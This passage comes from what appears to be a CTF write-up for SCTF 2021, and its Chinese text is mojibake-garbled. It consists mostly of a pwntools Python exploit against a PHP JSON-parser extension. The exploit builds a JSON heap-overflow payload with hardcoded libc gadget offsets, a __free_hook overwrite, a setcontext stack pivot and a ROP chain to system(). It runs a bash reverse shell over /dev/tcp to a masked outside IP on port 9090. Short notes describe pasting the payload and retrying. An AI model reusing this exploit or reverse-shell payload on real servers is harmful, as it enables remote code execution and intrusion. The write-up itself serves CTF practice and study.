</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_php</span><span class=p>(</span><span class=n>buf</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;pwn.php&#34;</span><span class=p>,</span> <span class=s1>&#39;wb+&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>pf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>pf</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;&#39;&lt;?php
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>$data = jsonparser(&#34;</span><span class=si>%s</span><span class=s1>&#34;);
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>readfile($data);
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>?&gt;&#39;&#39;&#39;</span><span class=o>%</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_php2</span><span class=p>(</span><span class=n>buf</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;pwnjson&#34;</span><span class=p>,</span> <span class=s1>&#39;wb+&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>pf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>pf</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;&#39;</span><span class=si>%s</span><span class=s1>&#39;&#39;&#39;</span><span class=o>%</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pp64</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>rb</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u&#34;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=nb>hex</span><span class=p>((((</span><span class=n>num</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>num</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xffff</span><span class=p>)[</span><span class=mi>2</span><span class=p>:],</span><span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=n>num</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># print(pp64(0x1234))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># pp64 = lambda x  : p64(x)[:6] + rb&#34;\\u0000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.31.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># libc_base = 0x7ffff7474000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=mh>0x7faea6b33000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rdx_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x000000000012c050</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rdi_ret</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x0000000000026796</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=mh>0x000000000002535f</span> <span class=o>+</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rsi_ret</span> <span class=o>=</span> <span class=mh>0x000000000002890f</span> <span class=o>+</span> <span class=n>libc_base</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rdx_ret</span> <span class=o>=</span> <span class=mh>0x00000000000cb1cd</span> <span class=o>+</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 0x555556606000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># heap_base = 0x555556606000 + 0x1E1600</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=mh>0x56400792d000</span><span class=o>+</span> <span class=mh>0x1E1600</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__free_hook&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shell_addr</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__free_hook&#34;</span><span class=p>]</span><span class=o>+</span> <span class=mh>0x140</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x640</span> <span class=o>+</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>unpack_many</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>frame</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>rb</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>{
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;bb\&#34;:\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;aa\&#34;:\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;cc\&#34;:\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;dd\&#34;:\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;ee\&#34;:\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;ff\&#34;:\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;gg\&#34;:\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;ff\&#34;:\&#34;aaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;ee\&#34;:\&#34;aaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;dd\&#34;:\&#34;aaaaaa\&#34;,
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;zz\&#34;:\&#34;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\\\&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s2>&#34;b&#34;</span> <span class=o>*</span> <span class=mi>6</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>9</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += pp64(0x31) + pp64(0) * 3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>pp64</span><span class=p>(</span><span class=mh>0x31</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>free_hook</span> <span class=o>-</span> <span class=mh>0x30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += b&#39;b&#39; * (0x80-2)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += p64(0x7ffff7635e70)[:6]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += rb&#34;\\u0000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += p64(0x7ffff7635e70)[:6]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += rb&#34;\\u0000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += p64(0x7ffff7635e70)[:6]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += rb&#34;\\u0000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s1>&#39;\&#34;,&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span><span class=sa>rb</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;address\&#34;:\&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span><span class=mh>0x20</span> <span class=o>+</span> <span class=sa>rb</span><span class=s1>&#39;\&#34;,&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span><span class=sa>rb</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;rop\&#34;:\&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>pp64</span><span class=p>(</span><span class=n>rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>shell_addr</span><span class=p>)</span>  <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>rdx_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x640</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=mh>0xC0</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>  <span class=o>+</span><span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span> <span class=o>+</span> <span class=n>libc_base</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>15</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x640</span> <span class=o>+</span> <span class=mh>0x108</span> <span class=o>-</span> <span class=mh>0xc0</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += rop + rb&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&#34;&#39;.replace(b&#39; &#39;,rb&#39;\\u2020&#39;).replace(b&#34;\&#34;&#34;,rb&#39;\\u2022&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>rop</span> <span class=o>+</span> <span class=sa>rb</span><span class=s1>&#39;/bin/touch /ctf/work/asddd&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=sa>rb</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>u2020&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=sa>rb</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>u2022&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s1>&#39;\&#34;,&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span><span class=sa>rb</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;rops\&#34;:\&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x8</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>free_hook</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span><span class=sa>rb</span><span class=s2>&#34;</span><span class=se>\\\&#34;</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=sa>rb</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=p>(</span><span class=mi>6</span><span class=o>+</span><span class=mi>8</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span><span class=sa>rb</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>8</span><span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>rdx_gadget</span><span class=p>)</span>  <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span>  <span class=o>+</span><span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span> <span class=o>+</span> <span class=n>libc_base</span> <span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload += bytes(frame)[0x28:].replace(b&#39;\x00\x00&#39;,rb&#39;\\u0000&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>15</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x1C1E70</span> <span class=o>+</span> <span class=mh>0x108</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span> <span class=o>+</span> <span class=n>pp64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>7</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>rop</span> <span class=o>+</span> <span class=sa>rb</span><span class=s1>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xx.xx.xx/9090 0&gt;&amp;1&#34;&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=sa>rb</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>u2020&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=sa>rb</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>u2022&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s1>&#39;\&#34;,&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span><span class=sa>rb</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>    \&#34;rops\&#34;:\&#34;&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span><span class=mh>0x20</span> <span class=o>+</span> <span class=sa>rb</span><span class=s1>&#39;\&#34;,&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>rb</span><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>}
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create_php(payload.replace(rb&#39;\&#34;&#39;,rb&#39;&#34;&#39;))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>create_php</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>create_php2</span><span class=p>(</span><span class=n>payload</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>rb</span><span class=s1>&#39;\&#34;&#39;</span><span class=p>,</span><span class=sa>rb</span><span class=s1>&#39;&#34;&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åå°†<code>pwnjson</code>é‡Œé¢çš„&rsquo;\&lsquo;æ›¿æ¢æˆ&rsquo;' å¤åˆ¶åˆ°æ–‡æœ¬æ¡†ä¸­ç‚¹å‡»å‘é€å³å¯</p><p>webæœåŠ¡å †ç¯å¢ƒå¾ˆä¹± éœ€è¦å¤šæ¬¡çˆ†ç ´å°è¯•.</p><p><img src=/img/2021-12-25-SCTF/20211228082942015.jpg alt=img></p><p><img src=/img/2021-12-25-SCTF/20211228082941710.jpg alt=img></p><p>pwnjsonå¦‚ä¸‹:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;bb&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;aa&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;cc&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;dd&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;ee&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;ff&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
